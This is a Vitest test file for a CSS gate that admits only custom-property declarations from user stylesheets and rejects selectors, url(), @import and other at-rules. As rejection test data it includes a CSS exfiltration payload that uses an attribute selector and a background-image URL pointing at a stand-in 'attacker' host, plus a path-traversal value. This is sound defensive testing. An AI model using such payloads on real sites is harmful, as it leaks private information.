// R3-316's grammar gate, adversarially: every forbidden shape is rejected AND
// NAMED; comment- and string-hidden attempts do not change the verdict; clean
// declarations pass with their quoted values intact.
import { describe, it, expect } from 'vitest';
import { gateStylesheet, blankCssNoise, declaredStylesheets, sheetFromSource } from './contentStylesheet';

describe('clean sheets pass', () => {
  it('declarations-only CSS is admitted, quoted values intact', () => {
    const v = gateStylesheet('--bg: #101010;\n--font-body: "Lora", serif;\n');
    expect(v.ok).toBe(true);
    if (v.ok) expect(v.declarations).toContain('"Lora", serif');
  });

  it('comments are allowed (and carry no verdict)', () => {
    const v = gateStylesheet('/* a note */\n--bg: #101010;\n');
    expect(v.ok).toBe(true);
  });
});

describe('the forbidden shapes are rejected and NAMED', () => {
  const cases: Array<[string, string, RegExp]> = [
    ['a selector', '.sidebar { display: none; }', /selector/],
    ['url(', '--wash: url(paper.jpg);', /url\(/],
    ['@import', '@import url(evil.css);', /@import/],
    ['@font-face', '@font-face { src: url(a.woff2); }', /@font-face/],
    ['@layer', '@layer grove.content { }', /layer/],
    ['a bare property (not a custom prop)', 'color: red;', /custom-property/],
    ['a media at-rule', '@media (min-width: 600px) { }', /at-rules/],
  ];
  for (const [name, css, reasonRe] of cases) {
    it(`${name} → rejected, line named, excerpt quoted`, () => {
      const v = gateStylesheet(`--ok: 1;\n${css}\n--ok2: 2;\n`);
      expect(v.ok).toBe(false);
      if (!v.ok) {
        expect(v.line).toBe(2);
        expect(v.reason).toMatch(reasonRe);
        expect(v.excerpt.length).toBeGreaterThan(0);
      }
    });
  }
});

describe('hidden attempts do not change the verdict (the blanking rule)', () => {
  it('a url( inside a COMMENT is ignored — the comment carries no semantics', () => {
    expect(gateStylesheet('/* url(nothing-here) */\n--bg: #101010;\n').ok).toBe(true);
  });

  it('a REAL url( after a decoy comment is still caught', () => {
    const v = gateStylesheet('/* url(decoy) */\n--wash: url(real-evil.jpg);\n');
    expect(v.ok).toBe(false);
    if (!v.ok) expect(v.line).toBe(2);
  });

  it('a selector-shaped STRING inside a declaration is inert data, not a rule — admitted', () => {
    // String CONTENTS are blanked for the scan (so nothing inside a string can
    // smuggle a verdict-changing token) and the line remains a well-formed
    // declaration; a custom property never re-interprets its value as a rule.
    const v = gateStylesheet(`--note: "{ display: none; }";\n`);
    expect(v.ok).toBe(true);
    if (v.ok) expect(v.declarations).toContain('--note:');
  });

  it('blankCssNoise preserves offsets (line numbers stay true)', () => {
    const src = 'a { /* comment\nspanning lines */ }';
    const blanked = blankCssNoise(src);
    expect(blanked.indexOf('comment')).toBe(-1);
    expect(blanked.length).toBe(src.length);
  });
});

describe('the existence-oracle payload — the attack the grammar exists for', () => {
  it('the canonical exfiltration attempt is rejected by name', () => {
    const attack = `a[href^="/content/salary-"] { background-image: url("https://attacker/?hit"); }`;
    const v = gateStylesheet(attack);
    expect(v.ok).toBe(false);
    // Either catch is a correct rejection: the url( (the exfil channel) or the
    // selector (the reach). Both are named, line-accurate verdicts.
    if (!v.ok) expect(v.reason).toMatch(/selector|url\(/);
  });
});

describe('declaredStylesheets — the home entry names its sheets (MDX_FROM_MOUNT_SPEC D7)', () => {
  const HOME = '/app/content/home.mdx';

  it('resolves each value like a link in the home entry', () => {
    expect(declaredStylesheets(['themes/paper.mdx', './themes/ink.md'], HOME)).toEqual({
      keys: ['/app/content/themes/paper.mdx', '/app/content/themes/ink.md'],
      errors: [],
    });
  });

  it('absent means none, silently', () => {
    expect(declaredStylesheets(undefined, HOME)).toEqual({ keys: [], errors: [] });
  });

  it('a value that is not a list is an error naming the key, not a guess', () => {
    const { keys, errors } = declaredStylesheets('themes/paper.mdx', HOME);
    expect(keys).toEqual([]);
    expect(errors).toEqual([expect.stringContaining('`stylesheets:`')]);
  });

  it('a value that names no entry inside the corpus is an error naming the value', () => {
    const { keys, errors } = declaredStylesheets(['../outside.mdx', 'themes/paper.css', 42, 'themes/paper.mdx'], HOME);
    expect(keys).toEqual(['/app/content/themes/paper.mdx']);
    expect(errors).toHaveLength(3);
    expect(errors[0]).toContain('../outside.mdx');
    expect(errors[1]).toContain('themes/paper.css');
    expect(errors[2]).toContain('42');
  });

  it('a sheet declared twice is read once', () => {
    expect(declaredStylesheets(['themes/paper.mdx', './themes/paper.mdx'], HOME).keys).toEqual([
      '/app/content/themes/paper.mdx',
    ]);
  });
});

describe('sheetFromSource', () => {
  it('splits the body CSS from the declared fonts and assets', () => {
    const sheet = sheetFromSource(
      '/app/content/themes/paper.mdx',
      '---\nfonts:\n  - family: Lora\nassets:\n  paper: ./paper.jpg\n---\n--wash: var(--asset-paper);\n',
    );
    expect(sheet.path).toBe('/app/content/themes/paper.mdx');
    expect(sheet.css.trim()).toBe('--wash: var(--asset-paper);');
    expect(sheet.declarations.assets).toEqual({ paper: './paper.jpg' });
    expect(Array.isArray(sheet.declarations.fonts)).toBe(true);
  });
});
